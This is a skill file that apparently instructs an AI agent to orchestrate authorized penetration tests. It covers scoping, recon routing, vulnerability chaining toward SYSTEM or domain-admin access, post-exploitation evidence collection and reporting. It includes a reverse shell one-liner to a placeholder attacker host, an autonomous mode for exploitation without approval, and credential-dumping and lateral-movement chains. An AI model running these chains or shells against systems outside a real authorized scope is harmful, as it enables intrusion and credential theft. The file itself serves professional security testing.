---
name: orchestrator
description: >
  Master orchestrator for penetration testing engagements. Takes a target (IP,
  hostname, URL, subnet), handles scoping, recon, attack surface mapping,
  vulnerability chaining, and routing to discovery and technique skills.
  Do NOT use for single-technique exploitation — route directly to the
  relevant technique skill instead.
keywords:
  - pentest this target
  - start an engagement
  - scan this host
  - assess this network
  - attack this target
  - full pentest
  - start testing
  - engagement against
  - begin assessment
  - structured assessment
  - pentest orchestration
tools:
  - nmap
  - httpx
  - bbot
  - ffuf
  - netexec
  - nuclei
opsec: medium
---

# Penetration Test Orchestrator

You are orchestrating a penetration test. Your job is to take a target,
establish scope, perform reconnaissance, map the attack surface, identify
vulnerabilities, chain them for maximum impact, and route to the correct
technique skills for exploitation. All testing is under explicit written
authorization.

> **DO NOT RUN SCANNING TOOLS.** The orchestrator's most common failure is
> running `nmap`, `ffuf`, `nuclei`, or `netexec` directly instead of routing
> to the correct skill. You are a router, not a scanner. If you are about to
> type `nmap`, route to **network-recon** instead. If you are about to type
> `ffuf`, route to **web-discovery** instead. See "Commands the Orchestrator
> May Execute Directly" below for the exhaustive allowed list.

## Skill Routing Is Mandatory

When this skill says "Route to **skill-name**", you MUST:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

Do NOT execute techniques inline — even if the attack path seems obvious or you
already know the technique. Technique skills contain curated payloads, edge-case
handling, troubleshooting steps, and methodology that general knowledge lacks.
Skipping skill loading trades thoroughness for speed and risks missing things on
harder targets.

This applies in both guided and autonomous modes. Autonomous mode means you
make triage and routing decisions without asking — it does not mean you bypass
the skill library.

### Finding Skills

When you need a skill but don't know the exact name:
- `search_skills("description of what you need")` — semantic search, returns ranked matches
- `list_skills(category="web")` — browse all skills in a category

**Relevance validation**: Search results are ranked by embedding similarity, not
guaranteed relevance. Before loading a search result with `get_skill()`, verify
the returned description actually matches your scenario. If the top result looks
tangential, try a more specific query or browse with `list_skills()` instead.

### If the MCP Skill Router Is Unavailable

If `get_skill()`, `search_skills()`, or `list_skills()` return errors or are
not available as tools, **STOP**. Do not fall back to executing techniques
inline. Tell the user:

> MCP skill-router is not connected. Verify `.mcp.json` is configured and the
> server is running. If the index is missing, run:
> `uv run --directory tools/skill-router python indexer.py`
> then restart Claude Code.

### Commands the Orchestrator May Execute Directly

The orchestrator routes to skills — it does not run attack tools itself.
The only commands the orchestrator may execute directly are:

- `mkdir -p engagement/evidence` — engagement directory creation
- File writes to `engagement/` — scope.md, state.md, activity.md, findings.md
- `httpx -u <target> -title -tech-detect -status-code -follow-redirects` — initial web triage only
- MCP tool calls (`get_skill`, `search_skills`, `list_skills`) — skill routing

Everything else — nmap, netexec, ffuf, nuclei, sqlmap, any exploitation tool —
MUST go through the appropriate skill.

**If you are unsure whether a command is on the allowed list, it is not.
Route to a skill.**

### Do Not Delegate Targets to Sub-Agents

**Never use the Task tool to delegate target-level work to sub-agents.** The
Skill tool is only available in the main conversation thread. Task sub-agents
cannot invoke skills — they execute techniques inline, bypassing all skill
routing, engagement logging, and state management. This defeats the entire
purpose of the skill library.

This is the orchestrator's most dangerous failure mode in multi-target
engagements. The temptation to parallelize by spawning one agent per target is
strong, especially in autonomous mode. Resist it. A sub-agent "doing pentesting"
without skills is just general-purpose Claude improvising — it skips
methodology, misses edge cases, and produces inconsistent results.

**What you may use Task sub-agents for:**
- Pure research (searching for CVE details, reading documentation)
- Local processing (parsing scan output, cracking hashes, compiling exploits)
- Anything that does not require skill routing or target interaction

**What you must NOT use Task sub-agents for:**
- Running scanning or enumeration tools against targets
- Exploiting vulnerabilities
- Post-exploitation enumeration or privilege escalation
- Anything a skill exists for

See "Multi-Target Engagements" (Step 8) for the correct approach.

### Pre-Routing Checkpoint

Before every skill invocation, write `engagement/state.md` and append to
`engagement/activity.md` with current findings. Format:
```
### [YYYY-MM-DD HH:MM:SS] orchestrator → routing to <skill-name>
- State: <brief summary of what's known>
- Reason: <why this skill was chosen>
```

### Post-Skill Checkpoint

When a skill completes and returns control to the orchestrator:

1. Re-read `engagement/state.md` — the skill should have updated it
2. Check for new credentials, access, or vulns added by the skill
3. Run the Step 5 decision logic (check unexploited vulns, unchained access,
   untested creds, pivot map, blocked items, progress toward objectives)
4. Route to the next skill based on updated state

Skills should NOT chain directly into other skills' scope areas. If a discovery
skill finds something outside its scope, it updates state.md and returns — the
orchestrator decides what to invoke next.

## Mode

Check if the user has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it with a one-line explanation and wait for user approval.
  Present attack surface maps, chain analysis, and routing decisions — let the
  user choose which paths to pursue. Confirm before invoking each technique
  skill. Never execute multiple target-touching commands without approval
  between them.
- **Autonomous**: Execute recon through exploitation. Make triage decisions.
  Route to technique skills automatically. Report at phase boundaries and
  when significant access is gained.

If unclear, default to guided.

## Invocation Log

Immediately on activation — before scoping or doing any work — log invocation
to the screen:

1. **On-screen**: Print `[orchestrator] Activated → <target>` so the operator
   sees the engagement is starting.
2. **activity.md**: After creating the engagement directory in Step 1, append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → <target>
   - Invoked (engagement starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written as soon as the engagement directory exists.
Subsequent milestone entries append bullet points under this same header or
create new headers as phases progress.

## Step 1: Scope & Engagement Setup

### Define Scope

Gather from the user:
- **Targets**: IPs, hostnames, URLs, subnets, or domains in scope
- **Out of scope**: Hosts, services, or actions explicitly excluded
- **Credentials**: Any provided credentials, tokens, or API keys
- **Rules of engagement**: Testing windows, restricted techniques, notification
  requirements, OPSEC constraints
- **Objectives**: What does success look like? Domain admin? Data exfil proof?
  Specific system access?

### Initialize Engagement Directory

Create the engagement directory structure:

```bash
mkdir -p engagement/evidence
```

**engagement/scope.md** — record scope from user input:

```markdown
# Engagement Scope

## Targets
- <targets from user>

## Out of Scope
- <exclusions>

## Credentials
- <provided creds>

## Rules of Engagement
- <constraints>

## Objectives
- <goals>
```

**engagement/state.md** — initialize empty state:

```markdown
# Engagement State

## Targets

## Credentials

## Access

## Vulns

## Pivot Map

## Blocked
```

**engagement/activity.md** — start the activity log:

```markdown
# Activity Log
```

**engagement/findings.md** — start the findings tracker:

```markdown
# Findings
```

## Step 2: Reconnaissance

Map the attack surface by routing to discovery skills. Do not run scanning or
enumeration tools directly from the orchestrator.

### Network Recon (if IP/subnet in scope)

STOP. Route to **network-recon** — call `get_skill("network-recon")` and follow
its instructions. Pass: target IP, hostname, or CIDR range, current mode, and
any credentials from scope. Do not execute nmap, masscan, or netexec commands
inline.

Network-recon will:
1. Run host discovery (for subnets) and full port scanning
2. Enumerate services on each open port with quick-win checks (anonymous access,
   default creds, known CVEs)
3. Perform OS fingerprinting
4. Run vulnerability scanning (NSE scripts, nuclei)
5. Update state.md with all discovered hosts, ports, and services
6. Return routing recommendations for next steps

Wait for network-recon to complete before proceeding to attack surface mapping.

### Web Discovery (if HTTP/HTTPS found)

STOP. Route to **web-discovery** — call `get_skill("web-discovery")` and follow
its instructions. Pass: target URL, technology stack (from network-recon
results), current mode. Do not execute ffuf, httpx, or nuclei commands inline.

### Host Enumeration (if domain environment suspected)

STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow
its instructions. Pass: target IP, domain name (from LDAP rootDSE or SMB
discovery), any credentials. Do not execute netexec or ldapsearch commands
inline.

### Update State

After discovery skills return, update `engagement/state.md` Targets section
with discovered hosts, ports, services, and technologies.

Log to `engagement/activity.md`:
```markdown
### [YYYY-MM-DD HH:MM:SS] orchestrator → recon
- Routed to network-recon → N open ports found
- Web services found: <list>
- Technologies: <list>
- Domain environment: yes/no
```

## Step 3: Attack Surface Mapping

Based on recon results, categorize the attack surface:

| Surface | Indicators | Action |
|---------|-----------|--------|
| Web application | HTTP/HTTPS, login forms, APIs | Route to **web-discovery** via `get_skill()` |
| Active Directory | LDAP (389/636), Kerberos (88), SMB domain | Route to **ad-discovery** via `get_skill()` |
| Containers / K8s | Docker API (2375), K8s API (6443/8443), kubelet (10250), etcd (2379), or inside a container | Route to **container-escapes** via `get_skill()` |
| Database | MySQL (3306), MSSQL (1433), PostgreSQL (5432) | Direct DB testing |
| Mail | SMTP (25/587), IMAP (143/993) | Credential attacks, phishing |
| SMB vulnerability | SMB (445) + confirmed CVE (MS08-067, MS17-010, SMBGhost, MS09-050) | Route to **smb-exploitation** via `get_skill()` |
| File shares | SMB (445), NFS (2049) | Enumeration, sensitive files |
| Remote access | SSH (22), RDP (3389), WinRM (5985) | Route to **password-spraying** via `get_skill()` |
| Custom services | Non-standard ports | Manual investigation |

**In guided mode**: Present the attack surface map and ask which paths to
pursue first. Recommend starting with the highest-value targets.

**In autonomous mode**: Prioritize by likely impact: web apps → AD → databases
→ other services.

## Step 4: Vulnerability Discovery & Exploitation

Route to discovery skills based on attack surface. Pass along:
- Target details (URL, IP, port, technology)
- Current mode (guided/autonomous)
- Any credentials from scope or already discovered

### Web Applications

STOP. Route to **web-discovery** — call `get_skill("web-discovery")` and follow
its instructions. Pass: target URL, technology stack, current mode, any
credentials. Do not execute ffuf, httpx, or nuclei commands inline.

### Active Directory

STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow
its instructions. Pass: DC IP, domain name, any credentials, current mode.
Do not execute netexec, ldapsearch, or bloodhound commands inline.

### Credential Attacks

For services with authentication (SSH, RDP, SMB, web login):

STOP. Route to **password-spraying** — call `get_skill("password-spraying")`
and follow its instructions. Pass: target IP, service type(s), any known
usernames and passwords, current mode. Do not execute netexec or hydra commands
inline.

## Step 5: Vulnerability Chaining

This is the critical orchestrator function. Read `engagement/state.md` and
analyze the Pivot Map to chain vulnerabilities for maximum impact.

### Chaining Strategy

Think through these chains systematically:

**Direct Access (no credentials needed):**
- SMB vulnerability confirmed → route to **smb-exploitation** via `get_skill()` → SYSTEM shell
- SMB exploitation → SYSTEM → route to **credential-dumping** via `get_skill()` → lateral movement

**Information → Access:**
- LFI reads config → credentials → database/service access
- SSRF reaches internal service → metadata credentials → cloud access
- XXE reads files → SSH keys or passwords → host access
- SQLi dumps users table → password reuse → admin panel

**Access → Deeper Access:**

Common chains that produce shell access on a host:
- Web shell / backdoor with default or discovered credentials → shell access
- Database access → xp_cmdshell (MSSQL) / UDF (MySQL) / COPY TO/FROM PROGRAM
  (PostgreSQL) → OS command execution → shell access
- JWT forgery → admin panel → file upload → web shell → shell access
- Deserialization RCE → service account → shell access
- Command injection confirmed → shell access
- File upload bypass → web shell → shell access

> **Shell access gained → stabilize → host discovery routing (mandatory).**
>
> When any chain above produces command execution on a host, follow this
> sequence before doing anything else:
>
> **1. Stabilize access — get an interactive shell.**
> A webshell, blind RCE callback, or database command execution is NOT a stable
> shell. Before routing to discovery, upgrade to an interactive reverse shell:
> - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python pty, or nc
> - Windows: PowerShell reverse shell, nc.exe, or establish WinRM/SSH if creds
>   are available
>
> Discovery skills assume interactive shell access. Trying to enumerate privesc
> vectors through a webshell (URL-encoded commands, one-shot execution) is
> fragile, slow, and misses output that requires an interactive terminal. Get a
> proper shell first.
>
> **2. Route to the appropriate discovery skill.**
> Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
> host enumeration commands inline. Route:
>
> - Linux target → STOP. Route to **linux-discovery** via `get_skill("linux-discovery")`.
> - Windows target → STOP. Route to **windows-discovery** via `get_skill("windows-discovery")`.
>
> Pass: target hostname/IP, current user, access method (specify: interactive
> reverse shell on port X, SSH session, WinRM, etc.), current mode, any
> credentials. The discovery skill enumerates systematically and routes to the
> correct technique skill (sudo/SUID abuse, cron/MOTD exploitation, kernel
> exploits, token impersonation, etc.). Inline enumeration skips methodology
> and misses vectors.
>
> This applies every time new shell access is gained — including after lateral
> movement to a new host.

**Lateral Movement:**
- Credentials from one host → test against all others in scope
- Service account → Kerberoasting → more credentials
- Machine keys from IIS → ViewState RCE on other IIS sites
- Database link → linked server → second database
- Host access on new subnet → route to **pivoting-tunneling** via `get_skill()` → then route to **network-recon** via `get_skill()` on internal network

**Privilege Escalation:**
- Local admin → dump credentials → domain user
- Domain user → Kerberoasting/ASREProasting → service accounts
- Service account → delegation abuse → domain admin
- ADCS misconfiguration → certificate forgery → domain admin
- Containerized shell → route to **container-escapes** via `get_skill()` → host access → route to **linux-discovery** or **windows-discovery** via `get_skill()`

### Decision Logic

When reading state.md, the orchestrator should:

1. **Check for unexploited vulns** — route to the appropriate technique skill
2. **Check for shell access without root/SYSTEM** — if the Access section shows
   a non-root shell on Linux or non-SYSTEM/non-admin shell on Windows, route to
   **linux-discovery** or **windows-discovery** via `get_skill()`. Do not
   enumerate privilege escalation vectors inline.
3. **Check for unchained access** — can existing access reach new targets?
4. **Check credentials** — have all found credentials been tested against all
   services?
5. **Check pivot map** — are there identified paths not yet followed?
6. **Check blocked items** — has anything changed that might unblock a
   previously failed technique?
7. **Assess progress toward objectives** — are we closer to the goal defined
   in scope.md?
8. **No hardcoded route matches** — if the scenario doesn't match any routing
   above, use dynamic search:
   a. Call `search_skills("description of what you need")` — results below 0.4
      similarity are filtered automatically.
   b. **Validate before loading**: Read the returned description for each
      result. Does it match the current scenario? A high similarity score
      does not guarantee relevance — the embedding model can confuse adjacent
      techniques (e.g., SSRF/CSRF, IDOR/ACL-abuse). If the description
      doesn't fit, skip it and check the next result or try a different query.
   c. Load the validated skill with `get_skill()` and **re-check after loading**:
      scan the skill's Prerequisites and Step 1 (Assess). If the skill expects
      conditions that don't match the current engagement state (wrong OS,
      wrong protocol, requires access you don't have), STOP — do not force-fit
      the skill. Return to the search results or fall back to general methodology.
   d. If no search result is relevant, proceed with general methodology and
      note the coverage gap in `engagement/activity.md`.

**In guided mode**: Present the chain analysis and recommend next steps.
Show the reasoning: "We have SQLi on the web app. We could extract credentials
and test them against SMB, or we could try to get command execution via
stacked queries."

**In autonomous mode**: Execute the highest-impact chain automatically.
Report at each milestone.

## Step 6: Post-Exploitation

When significant access is gained (shell, domain admin, database):

1. **Collect evidence** — save proof to `engagement/evidence/`
2. **Update state.md** — add new access, credentials, and vulns
3. **Check objectives** — have we met the engagement goals?
4. **Continue or wrap up** — if objectives met, move to reporting. If not,
   continue chaining.

### Evidence Collection

**Important — Windows path quoting:** Paths with spaces (e.g.,
`C:\Documents and Settings\`) must use double quotes in cmd.exe. Without
quotes, cmd.exe splits on spaces and the command fails.

```bash
# On compromised host — collect proof
whoami /all
ipconfig /all
systeminfo

# Domain info if applicable
net user /domain
net group "Domain Admins" /domain

# Flags (quote paths with spaces — especially Windows XP)
type "C:\Documents and Settings\<user>\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
# Or on Vista+:
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

Save output to `engagement/evidence/` with descriptive filenames.

## Step 7: Multi-Target Engagements

When the scope includes multiple targets (multiple IPs, a subnet, a CTF with
several boxes), the orchestrator must process them without breaking skill
routing. The key constraint: **skills can only be invoked from the main
conversation thread**, so all target work must flow through the orchestrator.

### Strategy: Phase-Based Cycling

Process all targets through the same phase before advancing, rather than
completing one target end-to-end before starting another. This enables
cross-pollination of discoveries (credentials from target A tested against
target B) and strategic prioritization.

**Phase 1 — Recon all targets:**
Invoke **network-recon** for each target (or once for the full scope). Build
the complete attack surface map in state.md before choosing where to attack.

**Phase 2 — Triage and prioritize:**
After recon, rank targets by exploitability:
1. Known CVEs with public exploits
2. Default/anonymous access (unauthenticated DB, open shares)
3. Web applications with discoverable attack surface
4. Services requiring credential attacks

**Phase 3 — Work the highest-value target:**
Route through discovery → technique skills for the top-priority target. When
you gain access or get blocked, update state.md and move to the next target.

**Phase 4 — Cross-pollinate:**
After each target yields credentials or access, check state.md for
opportunities on other targets:
- New creds → test against all targets with matching services
- New network access → check for internal-only services on other targets
- Patterns (same OS, same app framework) → apply same technique

**Phase 5 — Cycle back:**
Revisit blocked targets with new information. Repeat until all targets are
exhausted or objectives are met.

### What NOT To Do

- **Do not spawn one Task sub-agent per target.** Sub-agents cannot invoke
  skills. This is the single most common orchestrator failure in multi-target
  engagements — it looks efficient but produces skill-less, methodology-free
  improvisation on every target.
- **Do not go deep on one target while ignoring others.** If you're stuck on
  privesc for target A, move to target B. Fresh targets often yield quick wins
  that unlock progress elsewhere.
- **Do not run the same skill on multiple targets simultaneously.** Invoke
  skills one at a time. The sequential overhead is the price of methodology.

### State Management for Multiple Targets

State.md tracks all targets in one file. Use per-target one-liners:

```markdown
## Targets
- 10.10.10.1 | Windows Server 2019 | DC | 53,88,135,389,445,636,3268,3389,5985
- 10.10.10.5 | Ubuntu 22.04 | Web | 22,80,443

## Access
- 10.10.10.5 | www-data via reverse shell (port 4444) | from XXE → webshell → rev shell
- 10.10.10.1 | no access yet

## Credentials
- admin:Password123 (found on 10.10.10.5, untested on 10.10.10.1)
```

After each skill invocation, check ALL targets for newly actionable state —
not just the target that was just worked on.

## Step 8: Reporting

When the engagement is complete (objectives met or testing window closed):

1. Read `engagement/state.md` for the full picture
2. Read `engagement/findings.md` for confirmed vulnerabilities
3. Summarize the attack narrative — how each chain progressed
4. Write up each finding in `engagement/findings.md` with severity, impact, evidence path, and reproduction steps.

### Engagement Summary Template

```markdown
# Engagement Summary

## Scope
<from scope.md>

## Attack Narrative
<Chronological story of the engagement: recon → initial access → pivoting →
objective completion>

## Key Findings
<Top findings by severity, with brief description and impact>

## Attack Chains
<Diagram or description of how vulnerabilities were chained>

## Recommendations
<Prioritized remediation guidance>
```

### Retrospective

After presenting the engagement summary, suggest running a retrospective:

> Engagement complete. Want to run a retrospective? It reviews skill routing
> decisions, identifies payload and methodology gaps, and produces actionable
> improvements to make the skills work better for you next time.

If the user agrees, route to **retrospective** — call `get_skill("retrospective")`
and follow its instructions.

## OPSEC Notes

- Recon phase (nmap, httpx) is relatively low-OPSEC but generates network
  traffic — use `-T2` or `--rate` flags if stealth is required
- Credential spraying can trigger lockouts — always check lockout policy first
- Technique skills have their own OPSEC ratings — check before routing
- In OPSEC-sensitive engagements, prefer passive recon and targeted testing
  over broad scanning

## Troubleshooting

### No Web Services Found

- Check if HTTP is on non-standard ports: `nmap -p- TARGET`
- Check for HTTPS-only: `nmap -sV -p 443,8443,8080,4443 TARGET`
- Check for virtual hosts: requires hostname, not just IP

### Credentials Not Working Across Services

- Different password policies per service
- Account may be disabled on target service
- Kerberos vs NTLM authentication differences
- Check for MFA on target service

### Stuck — No Clear Next Step

- Re-read `engagement/state.md` — look for unchained access or untested creds
- Check Blocked section — has context changed?
- Try broader recon: full port scan, UDP scan, subdomain enumeration
- Check for default credentials on discovered services
- Look for information disclosure: error pages, directory listings, exposed configs
